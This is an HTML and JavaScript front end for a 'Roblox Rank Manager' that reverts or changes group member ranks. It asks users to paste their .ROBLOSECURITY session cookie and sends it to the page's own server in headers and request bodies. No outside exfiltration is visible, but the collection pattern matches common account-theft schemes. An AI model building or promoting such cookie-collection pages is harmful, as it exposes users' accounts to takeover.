<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roblox Rank Manager</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0f172a;
      color: #f8fafc;
      margin: 0; padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      margin-bottom: 1rem;
      font-weight: 700;
      font-size: 2rem;
    }
    .hidden {
      display: none;
    }
    input, select, button {
      width: 100%;
      max-width: 400px;
      padding: 0.8rem 1rem;
      margin-top: 0.5rem;
      border-radius: 0.5rem;
      border: none;
      font-size: 1rem;
      box-shadow: 0 2px 6px rgb(0 0 0 / 0.25);
    }
    input, select {
      background: #1e293b;
      color: #f8fafc;
    }
    button {
      background: #3b82f6;
      color: white;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.25s ease;
    }
    button:hover:not(:disabled) {
      background: #2563eb;
    }
    button:disabled {
      background: #4b5563;
      cursor: not-allowed;
    }
    .nav-buttons {
      display: flex;
      gap: 1rem;
      margin-top: 1.5rem;
      max-width: 400px;
      width: 100%;
      justify-content: center;
    }
    .nav-buttons button {
      flex: 1;
    }
    .container {
      max-width: 600px;
      width: 100%;
      background: #1e293b;
      border-radius: 1rem;
      padding: 1.5rem 2rem;
      box-shadow: 0 4px 12px rgb(0 0 0 / 0.5);
      margin-top: 2rem;
    }
    label {
      font-weight: 600;
    }
    .log {
      background: #334155;
      padding: 1rem;
      border-radius: 0.7rem;
      margin-top: 1rem;
      max-height: 200px;
      overflow-y: auto;
      white-space: pre-wrap;
      font-family: monospace;
      font-size: 0.9rem;
      color: #d1d5db;
    }
    .search-input {
      margin-top: 1rem;
      margin-bottom: 0.5rem;
      width: 100%;
      max-width: 400px;
      padding: 0.7rem 1rem;
      font-size: 1rem;
      border-radius: 0.5rem;
      border: none;
      box-shadow: 0 2px 6px rgb(0 0 0 / 0.25);
      background: #1e293b;
      color: #f8fafc;
    }
  </style>
</head>
<body>

  <h1>Roblox Rank Manager</h1>

  <!-- START PAGE -->
  <div id="start-page" class="container">
    <label for="cookieInput">üîë Enter your .ROBLOSECURITY cookie</label>
    <input id="cookieInput" type="password" placeholder="Paste your cookie here" autocomplete="off" />
    <button id="cookieSubmitBtn" disabled>Continue</button>
    <div id="cookieError" style="color:#f87171; margin-top:0.5rem;"></div>
  </div>

  <!-- NAV BUTTONS -->
  <div id="navButtons" class="nav-buttons hidden">
    <button id="goRevertBtn">Revert Abuse</button>
    <button id="goManualBtn">Manual Rank Change</button>
  </div>

  <!-- REVERT ABUSE PAGE -->
  <div id="revertPage" class="container hidden">
    <label for="groupSelectRevert">üë• Select Group</label>
    <select id="groupSelectRevert"></select>

    <label for="currentRankRevert">üéØ Current Rank</label>
    <select id="currentRankRevert" disabled></select>

    <label for="newRankRevert">‚Ü©Ô∏è New Rank</label>
    <select id="newRankRevert" disabled></select>

    <button id="fetchRanksRevert" disabled>üì• Fetch Ranks</button>
    <button id="startRevert" disabled>üöÄ Start Revert</button>

    <div id="revertLog" class="log">Revert logs will appear here...</div>
    <button id="backFromRevert" style="margin-top:1rem; background:#ef4444;">Back</button>
  </div>

  <!-- MANUAL RANK CHANGE PAGE -->
  <div id="manualPage" class="container hidden">
    <label for="groupSelectManual">üë• Select Group</label>
    <select id="groupSelectManual"></select>

    <label for="rankSelectManual">üéØ Select Rank to List Users</label>
    <select id="rankSelectManual" disabled></select>

    <button id="fetchUsersManual" disabled>üì• Fetch Users</button>

    <input id="searchUserInput" class="search-input hidden" placeholder="Search users by username or ID" />

    <label for="userSelectManual" class="hidden" id="userSelectLabel">Select User</label>
    <select id="userSelectManual" disabled class="hidden"></select>

    <label for="newRankManual">‚Ü©Ô∏è New Rank</label>
    <select id="newRankManual" disabled></select>

    <button id="startManualChange" disabled>üöÄ Change Rank</button>

    <div id="manualLog" class="log">Manual logs will appear here...</div>
    <button id="backFromManual" style="margin-top:1rem; background:#ef4444;">Back</button>
  </div>

  <script>
    let cookie = '';

    // Elements
    const cookieInput = document.getElementById('cookieInput');
    const cookieSubmitBtn = document.getElementById('cookieSubmitBtn');
    const cookieError = document.getElementById('cookieError');

    const navButtons = document.getElementById('navButtons');
    const goRevertBtn = document.getElementById('goRevertBtn');
    const goManualBtn = document.getElementById('goManualBtn');

    const startPage = document.getElementById('start-page');
    const revertPage = document.getElementById('revertPage');
    const manualPage = document.getElementById('manualPage');

    // Revert page elements
    const groupSelectRevert = document.getElementById('groupSelectRevert');
    const currentRankRevert = document.getElementById('currentRankRevert');
    const newRankRevert = document.getElementById('newRankRevert');
    const fetchRanksRevert = document.getElementById('fetchRanksRevert');
    const startRevertBtn = document.getElementById('startRevert');
    const revertLog = document.getElementById('revertLog');
    const backFromRevert = document.getElementById('backFromRevert');

    // Manual page elements
    const groupSelectManual = document.getElementById('groupSelectManual');
    const rankSelectManual = document.getElementById('rankSelectManual');
    const fetchUsersManual = document.getElementById('fetchUsersManual');
    const searchUserInput = document.getElementById('searchUserInput');
    const userSelectManual = document.getElementById('userSelectManual');
    const newRankManual = document.getElementById('newRankManual');
    const startManualChange = document.getElementById('startManualChange');
    const manualLog = document.getElementById('manualLog');
    const backFromManual = document.getElementById('backFromManual');
    const userSelectLabel = document.getElementById('userSelectLabel');

    // Enable Continue button only if cookie input is not empty
    cookieInput.addEventListener('input', () => {
      cookieSubmitBtn.disabled = cookieInput.value.trim().length === 0;
      cookieError.textContent = '';
    });

    cookieSubmitBtn.addEventListener('click', async () => {
      cookie = cookieInput.value.trim();
      cookieSubmitBtn.disabled = true;
      cookieError.textContent = '‚è≥ Fetching groups...';

      try {
        const res = await fetch('/groups', {
          headers: { 'x-cookie': cookie }
        });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const groups = await res.json();

        if (!Array.isArray(groups) || groups.length === 0) {
          cookieError.textContent = '‚ùå No manageable groups found for this cookie.';
          cookieSubmitBtn.disabled = false;
          return;
        }

        // Show nav buttons & hide start page
        navButtons.classList.remove('hidden');
        startPage.classList.add('hidden');

        // Fill group selects on both pages
        fillGroupSelects(groups);

        cookieError.textContent = '';
      } catch (err) {
        cookieError.textContent = `‚ùå Failed to load groups: ${err.message}`;
        cookieSubmitBtn.disabled = false;
      }
    });

    function fillGroupSelects(groups) {
      // Clear previous options
      groupSelectRevert.innerHTML = '';
      groupSelectManual.innerHTML = '';

      groups.forEach(g => {
        const opt1 = document.createElement('option');
        opt1.value = g.id;
        opt1.textContent = g.name;
        groupSelectRevert.appendChild(opt1);

        const opt2 = opt1.cloneNode(true);
        groupSelectManual.appendChild(opt2);
      });

      // Enable fetch buttons now that groups exist
      fetchRanksRevert.disabled = false;
      fetchUsersManual.disabled = true;
      currentRankRevert.disabled = true;
      newRankRevert.disabled = true;
      rankSelectManual.disabled = true;
      newRankManual.disabled = true;
      startRevertBtn.disabled = true;
      startManualChange.disabled = true;

      // Hide other pages if visible
      revertPage.classList.add('hidden');
      manualPage.classList.add('hidden');
    }

    // NAV BUTTONS
    goRevertBtn.addEventListener('click', () => {
      navButtons.classList.add('hidden');
      revertPage.classList.remove('hidden');
      manualPage.classList.add('hidden');
      revertLog.textContent = 'Revert logs will appear here...';

      // Reset revert form state
      currentRankRevert.innerHTML = '';
      newRankRevert.innerHTML = '';
      currentRankRevert.disabled = true;
      newRankRevert.disabled = true;
      fetchRanksRevert.disabled = false;
      startRevertBtn.disabled = true;
    });

    goManualBtn.addEventListener('click', () => {
      navButtons.classList.add('hidden');
      manualPage.classList.remove('hidden');
      revertPage.classList.add('hidden');
      manualLog.textContent = 'Manual logs will appear here...';

      rankSelectManual.innerHTML = '';
      newRankManual.innerHTML = '';
      userSelectManual.innerHTML = '';
      userSelectManual.classList.add('hidden');
      userSelectLabel.classList.add('hidden');
      searchUserInput.classList.add('hidden');
      searchUserInput.value = '';
      rankSelectManual.disabled = true;
      newRankManual.disabled = true;
      fetchUsersManual.disabled = true;
      userSelectManual.disabled = true;
      startManualChange.disabled = true;
    });

    // FETCH RANKS for revert page when group changes or Fetch Ranks clicked
    groupSelectRevert.addEventListener('change', () => {
      fetchRanksRevert.disabled = false;
      currentRankRevert.disabled = true;
      newRankRevert.disabled = true;
      startRevertBtn.disabled = true;
      currentRankRevert.innerHTML = '';
      newRankRevert.innerHTML = '';
    });

    fetchRanksRevert.addEventListener('click', async () => {
      const groupId = parseInt(groupSelectRevert.value);
      if (!groupId) return;

      revertLog.textContent = '‚è≥ Fetching ranks...';
      fetchRanksRevert.disabled = true;

      try {
        const res = await fetch(`/roles?groupId=${groupId}`);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const ranks = await res.json();

        currentRankRevert.innerHTML = '<option disabled selected>Select current rank</option>';
        newRankRevert.innerHTML = '<option disabled selected>Select new rank</option>';

        ranks.forEach(rank => {
          const option1 = document.createElement('option');
          option1.value = rank.id;
          option1.textContent = `(${rank.rank}) ${rank.name}`;
          currentRankRevert.appendChild(option1);

          const option2 = option1.cloneNode(true);
          newRankRevert.appendChild(option2);
        });

        currentRankRevert.disabled = false;
        newRankRevert.disabled = false;
        startRevertBtn.disabled = false;
        revertLog.textContent = '‚úÖ Ranks loaded!';
      } catch (err) {
        revertLog.textContent = `‚ùå Failed to fetch ranks: ${err.message}`;
      } finally {
        fetchRanksRevert.disabled = false;
      }
    });

    startRevertBtn.addEventListener('click', async () => {
      const groupId = parseInt(groupSelectRevert.value);
      const currentRankId = parseInt(currentRankRevert.value);
      const newRankId = parseInt(newRankRevert.value);

      if (!cookie || !groupId || !currentRankId || !newRankId) {
        revertLog.textContent = '‚ö†Ô∏è Please fill all fields.';
        return;
      }

      startRevertBtn.disabled = true;
      revertLog.textContent = '‚è≥ Reverting ranks...';

      try {
        const res = await fetch('/revert', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookie, groupId, currentRankId, newRankId })
        });

        const data = await res.json();

        if (data.success) {
          revertLog.textContent = `‚úÖ Reverted ${data.count} users.\n\n${data.logs.join('\n')}`;
        } else {
          revertLog.textContent = `‚ùå Error: ${data.error}`;
        }
      } catch (err) {
        revertLog.textContent = `‚ùå Failed to revert: ${err.message}`;
      } finally {
        startRevertBtn.disabled = false;
      }
    });

    backFromRevert.addEventListener('click', () => {
      revertPage.classList.add('hidden');
      navButtons.classList.remove('hidden');
      revertLog.textContent = 'Revert logs will appear here...';
    });

    // MANUAL PAGE LOGIC

    groupSelectManual.addEventListener('change', () => {
      rankSelectManual.disabled = true;
      newRankManual.disabled = true;
      fetchUsersManual.disabled = true;
      userSelectManual.disabled = true;
      userSelectManual.classList.add('hidden');
      userSelectLabel.classList.add('hidden');
      searchUserInput.classList.add('hidden');
      searchUserInput.value = '';
      rankSelectManual.innerHTML = '';
      newRankManual.innerHTML = '';
      userSelectManual.innerHTML = '';
      startManualChange.disabled = true;

      const groupId = parseInt(groupSelectManual.value);
      if (!groupId) {
        return;
      }

      // Fetch ranks to fill rankSelectManual & newRankManual
      fetchRolesForManual(groupId);
    });

    async function fetchRolesForManual(groupId) {
      manualLog.textContent = '‚è≥ Fetching ranks...';
      try {
        const res = await fetch(`/roles?groupId=${groupId}`);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const ranks = await res.json();

        rankSelectManual.innerHTML = '<option disabled selected>Select rank to list users</option>';
        newRankManual.innerHTML = '<option disabled selected>Select new rank</option>';

        ranks.forEach(rank => {
          const option1 = document.createElement('option');
          option1.value = rank.id;
          option1.textContent = `(${rank.rank}) ${rank.name}`;
          rankSelectManual.appendChild(option1);

          const option2 = option1.cloneNode(true);
          newRankManual.appendChild(option2);
        });

        rankSelectManual.disabled = false;
        newRankManual.disabled = false;
        manualLog.textContent = '‚úÖ Ranks loaded!';
      } catch (err) {
        manualLog.textContent = `‚ùå Failed to fetch ranks: ${err.message}`;
      }
    }

    rankSelectManual.addEventListener('change', () => {
      fetchUsersManual.disabled = false;
      userSelectManual.disabled = true;
      userSelectManual.classList.add('hidden');
      userSelectLabel.classList.add('hidden');
      searchUserInput.classList.add('hidden');
      searchUserInput.value = '';
      userSelectManual.innerHTML = '';
      startManualChange.disabled = true;
    });

    fetchUsersManual.addEventListener('click', async () => {
      const groupId = parseInt(groupSelectManual.value);
      const rankId = parseInt(rankSelectManual.value);
      if (!groupId || !rankId) return;

      manualLog.textContent = '‚è≥ Fetching users...';
      fetchUsersManual.disabled = true;

      try {
        const res = await fetch(`/users?groupId=${groupId}&rankId=${rankId}`);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const users = await res.json();

        if (!users.length) {
          manualLog.textContent = '‚ùå No users found with that rank.';
          fetchUsersManual.disabled = false;
          return;
        }

        userSelectManual.innerHTML = '<option disabled selected>Select user</option>';
        users.forEach(user => {
          const option = document.createElement('option');
          option.value = user.userId;
          option.textContent = `${user.username} (ID: ${user.userId})`;
          userSelectManual.appendChild(option);
        });

        userSelectManual.classList.remove('hidden');
        userSelectLabel.classList.remove('hidden');
        searchUserInput.classList.remove('hidden');
        userSelectManual.disabled = false;
        startManualChange.disabled = false;
        manualLog.textContent = '‚úÖ Users loaded!';
      } catch (err) {
        manualLog.textContent = `‚ùå Failed to fetch users: ${err.message}`;
      } finally {
        fetchUsersManual.disabled = false;
      }
    });

    // Search filter on users
    searchUserInput.addEventListener('input', () => {
      const filter = searchUserInput.value.toLowerCase();
      const options = userSelectManual.options;
      for (let i = 0; i < options.length; i++) {
        const text = options[i].text.toLowerCase();
        options[i].style.display = text.includes(filter) ? '' : 'none';
      }
    });

    startManualChange.addEventListener('click', async () => {
      const groupId = parseInt(groupSelectManual.value);
      const userId = parseInt(userSelectManual.value);
      const newRankId = parseInt(newRankManual.value);

      if (!cookie || !groupId || !userId || !newRankId) {
        manualLog.textContent = '‚ö†Ô∏è Please fill all fields.';
        return;
      }

      startManualChange.disabled = true;
      manualLog.textContent = '‚è≥ Changing user rank...';

      try {
        const res = await fetch('/manual', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookie, groupId, userId, newRank: newRankId })
        });

        const data = await res.json();

        if (data.success) {
          manualLog.textContent = '‚úÖ User rank changed successfully!';
        } else {
          manualLog.textContent = `‚ùå Error: ${data.error}`;
        }
      } catch (err) {
        manualLog.textContent = `‚ùå Failed to change rank: ${err.message}`;
      } finally {
        startManualChange.disabled = false;
      }
    });

    backFromManual.addEventListener('click', () => {
      manualPage.classList.add('hidden');
      navButtons.classList.remove('hidden');
      manualLog.textContent = 'Manual logs will appear here...';

      rankSelectManual.innerHTML = '';
      newRankManual.innerHTML = '';
      userSelectManual.innerHTML = '';
      userSelectManual.classList.add('hidden');
      userSelectLabel.classList.add('hidden');
      searchUserInput.classList.add('hidden');
      searchUserInput.value = '';
      rankSelectManual.disabled = true;
      newRankManual.disabled = true;
      fetchUsersManual.disabled = true;
      userSelectManual.disabled = true;
      startManualChange.disabled = true;
    });
  </script>

</body>
</html>
